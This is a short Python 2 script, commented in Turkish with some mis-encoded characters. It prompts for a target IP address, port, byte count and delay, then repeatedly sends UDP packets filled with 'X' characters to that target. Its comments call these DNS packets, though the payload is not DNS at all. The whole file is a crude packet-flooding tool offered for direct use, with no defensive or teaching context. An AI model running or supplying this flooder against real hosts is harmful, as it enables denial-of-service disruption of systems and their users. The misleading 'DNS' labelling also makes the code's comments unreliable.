# -*- coding: utf-8 -*-

import socket
import time

def send_dns_packet(ip, port, byte_count, delay):
    # IP ve Port bilgileriyle soket nesnesi oluþturma
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Gönderilecek veri oluþturma
    data = "X" * byte_count

    # Belirtilen sayýda DNS paketi gönderme
    for _ in range(byte_count):
        sock.sendto(data, (ip, port))
        time.sleep(delay)

    # Soketi kapatma
    sock.close()

# Kullanýcýdan gerekli bilgileri alma
ip = raw_input("Hedef IP adresi: ")
port = input("Hedef port numarasý: ")
byte_count = input("Gönderilecek bayt miktarý: ")
delay = input("Gecikme süresi (saniye olarak): ")

# DNS paketi gönderme iþlemini baþlatma
send_dns_packet(ip, port, byte_count, delay)